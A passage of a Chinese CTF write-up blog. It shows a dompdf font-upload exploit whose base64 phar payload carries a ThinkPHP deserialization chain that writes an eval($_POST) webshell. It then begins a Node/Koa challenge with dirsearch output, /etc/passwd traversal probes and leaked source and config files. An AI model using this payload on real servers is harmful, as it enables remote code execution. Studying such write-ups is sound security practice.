src:url(&#x27;data:text/plain;base64,AAEAAAANAIAAAwBQRkZUTaDD5rQAAAVwAAAAHE9TLzJVeV76AAABWAAAAGBjbWFwAA0DlgAAAcQAAAE6Y3Z0IAAhAnkAAAMAAAAABGdhc3D%252F%252FwADAAAFaAAAAAhnbHlmPaWWPgAAAwwAAABUaGVhZCE%252FRL0AAADcAAAANmhoZWEEIAAAAAABFAAAACRobXR4ArkAIQAAAbgAAAAMbG9jYQAqAFQAAAMEAAAACG1heHAARwA5AAABOAAAACBuYW1lpiMmRgAAA2AAAAHjcG9zdP%252B3ADIAAAVEAAAAIgABAAAAAQAAj5CsK18PPPUACwPoAAAAAOBrAJ8AAAAA4GsAnwAhAAABKgKaAAAACAACAAAAAAAAAAEAAAKaAAAAWgAAAAD%252F%252FwEqAAEAAAAAAAAAAAAAAAAAAAAAAAEAAAADAAgAAgAAAAAAAgAAAAEAAQAAAEAALgAAAAAABAH0AZAABQAAAooCvAAAAIwCigK8AAAB4AAxAQIAAAIABQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUGZFZACA%252F%252F8AAAMg%252FzgAWgKaAAAAAAABAAAAAAAAAAAAAAAgAAEBbAAhAAAAAAFNAAAAAAADAAAAAwAAABwAAQAAAAAANAADAAEAAAAcAAQAGAAAAAIAAgAAAAD%252F%252FwAA%252F%252F8AAQAAAAABBgAAAQAAAAAAAAABAgAAAAIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACECeQAAACoAKgAqAAIAIQAAASoCmgADAAcALrEBAC88sgcEAO0ysQYF3DyyAwIA7TIAsQMALzyyBQQA7TKyBwYB%252FDyyAQIA7TIzESERJzMRIyEBCejHxwKa%252FWYhAlgAAAAADgCuAAEAAAAAAAAACgAWAAEAAAAAAAEACQA1AAEAAAAAAAIABwBPAAEAAAAAAAMAJQCjAAEAAAAAAAQACQDdAAEAAAAAAAUADwEHAAEAAAAAAAYACQErAAMAAQQJAAAAFAAAAAMAAQQJAAEAEgAhAAMAAQQJAAIADgA%252FAAMAAQQJAAMASgBXAAMAAQQJAAQAEgDJAAMAAQQJAAUAHgDnAAMAAQQJAAYAEgEXAEQAVQBNAE0AWQAgAEYATwBOAFQAAERVTU1ZIEZPTlQAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFIAZQBnAHUAbABhAHIAAFJlZ3VsYXIAAEYAbwBuAHQARgBvAHIAZwBlACAAMgAuADAAIAA6ACAAVQBuAHQAaQB0AGwAZQBkADEAIAA6ACAAMgAzAC0ANAAtADIAMAAyADMAAEZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyMy00LTIwMjMAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAFYAZQByAHMAaQBvAG4AIAAwADAAMQAuADAAMAAwAABWZXJzaW9uIDAwMS4wMDAAAFUAbgB0AGkAdABsAGUAZAAxAABVbnRpdGxlZDEAAAACAAAAAAAA%252F7UAMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH%252F%252FwACAAAAAQAAAADf7eV1AAAAAOBrAJ8AAAAA4GsAnzw%252FcGhwIF9fSEFMVF9DT01QSUxFUigpOyA%252FPg0K8wMAAAEAAAARAAAAAQAAAAAAvQMAAE86MTM6InRoaW5rXFByb2Nlc3MiOjM6e3M6Mjc6IgB0aGlua1xQcm9jZXNzAHByb2Nlc3NQaXBlcyI7TzoyODoidGhpbmtcbW9kZWxccmVsYXRpb25cSGFzTWFueSI6NTp7czo4OiIAKgBxdWVyeSI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjU6IndoZXJlIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjE6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6NjoiACoAdGFnIjtiOjE7czoxMDoiACoAb3B0aW9ucyI7YToyOntzOjY6ImV4cGlyZSI7aTowO3M6NjoicHJlZml4IjtzOjA6IiI7fXM6MTA6IgAqAGhhbmRsZXIiO086MjM6InRoaW5rXGNhY2hlXGRyaXZlclxGaWxlIjoyOntzOjY6IgAqAHRhZyI7YjowO3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MzYwMDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDtzOjQ6InBhdGgiO3M6NzQ6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1kZWNvZGUvcmVzb3VyY2U9L3Zhci93d3cvaHRtbC9wdWJsaWMvc2hlbGwucGhwIjt9fX19fXM6OToiACoAcGFyZW50IjtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6MTp7czoxOiJhIjtzOjE6IjEiO31zOjExOiIAKgBsb2NhbEtleSI7czoxOiJhIjtzOjg6IgAqAHBpdm90IjtOO3M6MTM6IgAqAGZvcmVpZ25LZXkiO3M6NTE6IkFBQVBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoySnZiMmRwY0c5d0oxMHBPejgrQ2crKyI7fXM6MjE6IgB0aGlua1xQcm9jZXNzAHN0YXR1cyI7aTozO3M6MzM6IgB0aGlua1xQcm9jZXNzAHByb2Nlc3NJbmZvcm1hdGlvbiI7YToxOntzOjc6InJ1bm5pbmciO2I6MTt9fQgAAAB0ZXN0LnR4dAQAAADqUEVkBAAAAAx%252Bf9ikAQAAAAAAAHRlc3SpuV9bLO9QZl15mVF8JesEYNmlUQIAAABHQk1C&#x27;);</span><br><span class="line">        font-weight:&#x27;normal&#x27;;</span><br><span class="line">        font-style:&#x27;normal&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 2 NOT ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    @font-face &#123;</span><br><span class="line">        font-family:&#x27;exploit&#x27;;</span><br><span class="line">        src:url(&#x27;phar:///var/www/html/vendor/dompdf/dompdf/lib/fonts/exploit_normal_58b7eee7dc2adb832946db6e899c457f.ttf##&#x27;);</span><br><span class="line">        font-weight:&#x27;normal&#x27;;</span><br><span class="line">        font-style:&#x27;normal&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
<p>这里我们需要本地起一个服务docker去观察一下，这里全是细节了。<br>首先打入第一个payload后生成的ttf文件名字和上述不同，我们需要自己手动观察。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682264511654-0e606744-90bb-49f7-a785-8506e73d2cea.png#averageHue=%23fefcfa&clientId=u9987de23-fb8b-4&from=paste&height=302&id=u98ef029a&name=image.png&originHeight=378&originWidth=1348&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48590&status=done&style=none&taskId=u71a4fd3c-d836-4f08-98aa-51d1ee100d1&title=&width=1078.4" alt="image.png"><br>可以看到<code>exploit_normal_68d0c0a2c8ad91268f107b3cebba8700.ttf</code><br>我们需要把第二段exp的md5改为上述看到的，之后打入之后会发现shell已经成功写入：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682265789106-f8976f15-bd37-47cf-bc9a-aff5b6ddc2ee.png#averageHue=%23fdfbf8&clientId=u9987de23-fb8b-4&from=paste&height=369&id=u2b3d8bd9&name=image.png&originHeight=461&originWidth=1314&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=67828&status=done&style=none&taskId=ua8625c3b-7d87-4a7d-b24a-39b1bfa8c66&title=&width=1051.2" alt="image.png"><br><code>shell.php3b58a9545013e88c7186db11bb158c44.php</code>这是名字，那么最后访问这个就可以获取shell了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682265810700-7386752b-eab9-4089-a16c-d603ff781513.png#averageHue=%23ababab&clientId=u9987de23-fb8b-4&from=paste&height=806&id=u135e523c&name=image.png&originHeight=1007&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=89237&status=done&style=none&taskId=ud82e4dc1-f012-43b0-b742-b1d79f63d13&title=&width=1535.2" alt="image.png"></p>
<h1 id="你听说过JS的webshell吗"><a href="#你听说过JS的webshell吗" class="headerlink" title="你听说过JS的webshell吗"></a>你听说过JS的webshell吗</h1><p>1.<br>coding 其他 git 托管凭据泄漏</p>
<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>打开网页<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682265863698-0c056fa6-1083-403c-aa75-1f09b04ca4d4.png#averageHue=%23d9d9d9&clientId=u9987de23-fb8b-4&from=paste&id=u18e1108a&name=image.png&originHeight=178&originWidth=1296&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=26525&status=done&style=none&taskId=u22ec909c-ed5a-4033-8748-00691c49ddb&title=" alt="image.png"><br>直接打开 f12 发现 api 与注释<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1682265863709-f816bc5d-329a-423a-ab9e-b0820d698607.png#averageHue=%232a3d61&clientId=u9987de23-fb8b-4&from=paste&id=u84510953&name=image.png&originHeight=704&originWidth=900&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=121182&status=done&style=none&taskId=ud908182d-1b84-4094-805a-f3e79dc6a8d&title=" alt="image.png"></p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>这里其实想说的是扫描该网站 看看有没有发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://127.0.0.1 # 这里不需要引入任何字典 泄漏的文件相当常见</span><br><span class="line"> </span><br><span class="line">   _|. _ _  _  _  _ _|_    v0.4.2.8</span><br><span class="line">  (_||| _) (/_(_|| (_| )</span><br><span class="line"> </span><br><span class="line"> Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11458</span><br><span class="line"> </span><br><span class="line"> Output File: /tmp/reports/</span><br><span class="line"> </span><br><span class="line"> Target: http://127.0.0.1/</span><br><span class="line"> </span><br><span class="line"> [23:23:56] Starting:</span><br><span class="line"> [23:23:56] 403 -    9B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line"> [23:23:56] 403 -    9B  - /%2e%2e//google.com</span><br><span class="line"> [23:23:58] 400 -   14B  - /\..\..\..\..\..\..\..\..\..\etc\passwd</span><br><span class="line"> [23:24:00] 200 -  679B  - /app.js</span><br><span class="line"> [23:24:01] 403 -    9B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line"> [23:24:02] 200 -  439B  - /config.js</span><br><span class="line"> [23:24:03] 200 -  170B  - /Dockerfile</span><br><span class="line"> [23:24:07] 200 -  627B  - /package.json</span><br><span class="line"> [23:24:07] 200 -   29KB - /package-lock.json</span><br><span class="line"> [23:24:08] 200 -    9B  - /Readme.md</span><br><span class="line"> [23:24:08] 200 -    9B  - /README.md</span><br><span class="line"> [23:24:08] 200 -    9B  - /README.MD</span><br><span class="line"> [23:24:08] 200 -    9B  - /ReadMe.md</span><br><span class="line"> [23:24:08] 200 -    9B  - /readme.md</span><br><span class="line"> [23:24:12] 200 -    6KB - /views</span><br><span class="line"> </span><br><span class="line"> Task Completed</span><br></pre></td></tr></table></figure>
<h3 id="入口点发现"><a href="#入口点发现" class="headerlink" title="入口点发现"></a>入口点发现</h3><p>发现存在相关的 js web 文件 尝试查看是否有其他泄漏。</p>
<ul>
<li><p>app.js</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">const Koa        = require(&#x27;koa&#x27;)</span><br><span class="line"> const bodyparser = require(&#x27;koa-bodyparser&#x27;)()</span><br><span class="line"> const static     = require(&#x27;koa-static&#x27;)</span><br><span class="line"> const cors       = require(&#x27;./cors&#x27;)</span><br><span class="line"> const template   = require(&#x27;./middlewares/template&#x27;)</span><br><span class="line"> const route      = require(&#x27;./middlewares/route&#x27;)</span><br><span class="line"> const api        = require(&#x27;./middlewares/api&#x27;)</span><br><span class="line"> const listen     = require(&#x27;./middlewares/listen&#x27;)</span><br><span class="line"> const production = process.env.NODE_ENV === &#x27;production&#x27;</span><br><span class="line"> </span><br><span class="line"> const app        = new Koa()</span><br><span class="line"> </span><br><span class="line"> app</span><br><span class="line">     .use(static(&#x27;./&#x27;))</span><br><span class="line">     .use(template(&#x27;views&#x27;, &#123;</span><br><span class="line">         // noCache: !production,</span><br><span class="line">         // watch  : !production</span><br><span class="line">     &#125;))</span><br><span class="line">     .use(bodyparser)</span><br><span class="line">     .use(cors)</span><br><span class="line">     .use(route)</span><br><span class="line">     .use(api)</span><br><span class="line"> </span><br><span class="line"> listen(app)</span><br></pre></td></tr></table></figure>
</li>
<li><p>package.json</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">     &quot;name&quot;: &quot;updater&quot;,</span><br><span class="line">     &quot;version&quot;: &quot;2.0.0&quot;,</span><br><span class="line">     &quot;description&quot;: &quot;&gt; v0.0.1&quot;,</span><br><span class="line">     &quot;main&quot;: &quot;app.js&quot;,</span><br><span class="line">     &quot;dependencies&quot;: &#123;</span><br><span class="line">         &quot;axios&quot;: &quot;^0.21.1&quot;,</span><br><span class="line">         &quot;koa&quot;: &quot;^2.13.0&quot;,</span><br><span class="line">         &quot;koa-bodyparser&quot;: &quot;^4.3.0&quot;,</span><br><span class="line">         &quot;koa-router&quot;: &quot;^9.1.0&quot;,</span><br><span class="line">         &quot;koa-sslify&quot;: &quot;^4.0.3&quot;,</span><br><span class="line">         &quot;koa-static&quot;: &quot;^5.0.0&quot;,</span><br><span class="line">         &quot;koa2-cors&quot;: &quot;^2.0.6&quot;,</span><br><span class="line">         &quot;nunjucks&quot;: &quot;^3.2.2&quot;</span><br><span class="line">     &#125;,</span><br><span class="line">     &quot;devDependencies&quot;: &#123;&#125;,</span><br><span class="line">     &quot;scripts&quot;: &#123;</span><br><span class="line">         &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;,</span><br><span class="line">         &quot;dev&quot;: &quot;pm2 start ecosystem.config.js&quot;,</span><br><span class="line">         &quot;prod&quot;: &quot;pm2 start ecosystem.config.js --env production&quot;</span><br><span class="line">     &#125;,</span><br><span class="line">     &quot;license&quot;: &quot;ISC&quot;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Readme # updater</p>
</li>
<li><p>config.js</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">const CONFIG = &#123;</span><br><span class="line">     server: &#123;</span><br><span class="line">         domain: &#x27;test.example.com&#x27;,</span><br><span class="line">         pact: &#x27;https&#x27;,</span><br><span class="line">         host: &#x27;0.0.0.0&#x27;,</span><br><span class="line">         port: &#x27;443&#x27;,</span><br><span class="line">     &#125;,</span><br><span class="line">     coding: &#123;</span><br><span class="line">         username: &#x27;test@test.com&#x27;,</span><br><span class="line">         password: &#x27;IAmTheCodeMaster&#x27;,</span><br><span class="line">         apiKey: &#x27;flag&#123;This is fake flag&#125;:-)&#x27;,</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> if (process.env.NODE_ENV === &#x27;development&#x27;) &#123;</span><br><span class="line">     CONFIG.server.pact = &#x27;http&#x27;,</span><br><span class="line">     CONFIG.server.port = &#x27;80&#x27;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> module.exports = CONFIG</span><br></pre></td></tr></table></figure>
<p>这里提到了 coding 还有用户名密码 （假的）并不知道 coding 是什么的情况下。 网站也没有登陆口。</p>
</li>
<li><p>Dockerfile</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FROM node:16</span><br><span class="line"> WORKDIR /app</span><br><span class="line"> COPY . /app</span><br><span class="line"> </span><br><span class="line"> RUN npm install &amp;&amp; npm install -g pm2</span><br><span class="line"> </span><br><span class="line"> EXPOSE 443</span><br><span class="line"> EXPOSE 80</span><br><span class="line"> CMD [&quot;pm2-runtime&quot;, &quot;/app/ecosystem.config.js&quot;, &quot;--env&quot;, &quot;production&quot;]</span><br></pre></td></tr></table></figure></li>
</ul>
<p>这里所有的证据都说明了 这个网站泄漏了源代码 也就是 js 文件<br>接下来测试是否存在 ecosystem.config.js 文件 来验证这个结论<br>我们可以试试 <a target="_blank" rel="noopener" href="https://127.0.0.1/ecosystem.config.js">https://127.0.0.1/ecosystem.config.js</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// Options reference: https://pm2.keymetrics.io/docs/usage/application-declaration/</span><br><span class="line"> const package = require(&#x27;./package.json&#x27;)</span><br><span class="line"> </span><br><span class="line"> module.exports = &#123;</span><br><span class="line">     apps: [&#123;</span><br><span class="line">         name               : package.name,</span><br><span class="line">         script             : &#x27;app.js&#x27;,</span><br><span class="line">         args               : &#x27;one two&#x27;,</span><br><span class="line">         instances          : 1,</span><br><span class="line">         autorestart        : true,</span><br><span class="line">         watch              : true,</span><br><span class="line">         ignore_watch       : [&#x27;node_modules&#x27;, &#x27;logs&#x27;, &#x27;.git&#x27;, &#x27;statics&#x27;],</span><br><span class="line">         error_file         : &#x27;logs/err.log&#x27;,</span><br><span class="line">         out_file           : &#x27;logs/out.log&#x27;,</span><br><span class="line">         log_file           : &#x27;logs/all.log&#x27;,</span><br><span class="line">         log_date_format    : &#x27;YYYY-MM-DD HH:mm:ss&#x27;,</span><br><span class="line">         max_memory_restart : &#x27;1G&#x27;,</span><br><span class="line">         env: &#123;</span><br><span class="line">             NODE_ENV       : &#x27;development&#x27;,</span><br><span class="line">         &#125;,</span><br><span class="line">         env_production: &#123;</span><br><span class="line">             NODE_ENV       : &#x27;production&#x27;,</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;],</span><br><span class="line">     deploy: &#123;</span><br><span class="line">         production: &#123;</span><br><span class="line">             // host          : CONFIG.remote.host,</span><br><span class="line">             // user          : CONFIG.remote.user,</span><br><span class="line">             // path          : CONFIG.remote.path,</span><br><span class="line">             // repo          : CONFIG.git.ssh,</span><br><span class="line">             // ref           : CONFIG.git.ref,</span><br><span class="line">             &#x27;post-deploy&#x27; : &#x27;npm install &amp;&amp; pm2 reload ecosystem.config.js --env production&#x27;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>
<p>很明显是存在 js 代码泄漏的</p>
<h3 id="检查-middleware"><a href="#检查-middleware" class="headerlink" title="检查 middleware"></a>检查 middleware</h3><p>通过 app.js 文件<br>可以翻找到 如下的库与中间件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const template   = require(&#x27;./middlewares/template&#x27;)</span><br><span class="line"> const route      = require(&#x27;./middlewares/route&#x27;)</span><br><span class="line"> const api        = require(&#x27;./middlewares/api&#x27;)</span><br><span class="line"> const listen     = require(&#x27;./middlewares/listen&#x27;)</span><br></pre></td></tr></table></figure>
<p>api listen route template 四个分别通过依赖注入的方式引入<br>这里直接去看 api<br>对于 api 分别尝试这三个文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://127.0.0.1/middlewares/api.js</span><br><span class="line"> https://127.0.0.1/middlewares/api</span><br><span class="line"> https://127.0.0.1/middlewares/api/index.js</span><br></pre></td></tr></table></figure>
<p>可以发现 index.js 有返回<br>如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">const fs       = require(&#x27;fs&#x27;)</span><br><span class="line"> const path     = require(&#x27;path&#x27;)</span><br><span class="line"> const router   = require(&#x27;koa-router&#x27;)()</span><br><span class="line"> const tools    = require(&#x27;../../utils&#x27;)</span><br><span class="line"> const Response = require(&#x27;../response&#x27;)</span><br><span class="line"> </span><br><span class="line"> // apiPath 为 当前目录的上上级 也就是 / 下 是可以访问的</span><br><span class="line"> const apiPath = path.join(__dirname, &#x27;../../api&#x27;)</span><br><span class="line"> </span><br><span class="line"> // 这里是网站自己实现的 CGI </span><br><span class="line"> // 动态的在 api 文件夹下所有的 js 文件注册进来 并且赋予对应的 path</span><br><span class="line"> function registeApi (dir) &#123;</span><br><span class="line">     // 遍历目录下所有文件</span><br><span class="line">     fs.readdirSync(dir).forEach(fileName =&gt; &#123;</span><br><span class="line">         // 文件完整路径</span><br><span class="line">         const filePath = path.join(dir, fileName)</span><br><span class="line"> </span><br><span class="line">         // 若该文件为目录，则继续遍历该目录下所有文件</span><br><span class="line">         if (fs.statSync(filePath).isDirectory()) return registeApi(filePath)</span><br><span class="line">         // 忽略入口文件</span><br><span class="line">         // if (filePath.endsWith(&#x27;index.js&#x27;))       return</span><br><span class="line">         // 忽略非 js 文件</span><br><span class="line">         if (!filePath.endsWith(&#x27;.js&#x27;))           return console.info(&#x27;非 JS 文件不要放在 api 目录下&#x27; + filePath)</span><br><span class="line"> </span><br><span class="line">         regist(filePath);</span><br><span class="line">     &#125;)</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> // 注册单个 api </span><br><span class="line"> function regist(filePath) &#123;</span><br><span class="line">     // API</span><br><span class="line">     // 通过 filePath 引入</span><br><span class="line">     const api     = require(filePath)</span><br><span class="line">     // API 名称</span><br><span class="line">     const apiName = getApiName(filePath)</span><br><span class="line"> </span><br><span class="line">     // 遍历请求方式</span><br><span class="line">     for (const type of Object.keys(api)) &#123;</span><br><span class="line">         // 响应操作 写入 router </span><br><span class="line">         router[type](apiName, async (ctx) =&gt; &#123;</span><br><span class="line">             await api[type](getRequest(ctx), new Response(ctx))</span><br><span class="line">         &#125;)</span><br><span class="line">         // 打印接口信息</span><br><span class="line">         apiLog(type, apiName)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> // 去掉 .js</span><br><span class="line"> function getApiName(filePath) &#123;</span><br><span class="line">     return filePath.cutEnd(3)</span><br><span class="line">         .replace(apiPath, &#x27;&#x27;)</span><br><span class="line">         .replace(/\\/g, &#x27;/&#x27;)</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> function getRequest(ctx) &#123;</span><br><span class="line">     return &#123;</span><br><span class="line">         params : &#123; ...ctx.request.body, ...tools.getUrlParams(ctx.request.url) &#125;,</span><br><span class="line">         page   : tools.getPagination(ctx),</span><br><span class="line">         ctx,</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> function apiLog (type, apiName, apiIntro = &#x27;&#x27;) &#123;</span><br><span class="line">     console.info(`$&#123;apiIntro&#125;\n[$&#123;type.toUpperCase()&#125;]: $&#123;apiName&#125;\n****************************************`)</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> // require 时注册 APIPATH</span><br><span class="line"> registeApi(apiPath)</span><br><span class="line"> </span><br><span class="line"> module.exports = (() =&gt; router.routes())()</span><br></pre></td></tr></table></figure>
<h3 id="整理逻辑-发现端倪"><a href="#整理逻辑-发现端倪" class="headerlink" title="整理逻辑 发现端倪"></a>整理逻辑 发现端倪</h3><p>在 &#x2F;api&#x2F;XXX 下的 任何 &#x2F;api&#x2F;path&#x2F;to&#x2F;api.js 都会被注册成 &#x2F;path&#x2F;to&#x2F;api<br>那么 查看 &#x2F; 下的所有请求出去的 api 你可以直接 grep 拿到如下的数据</p>
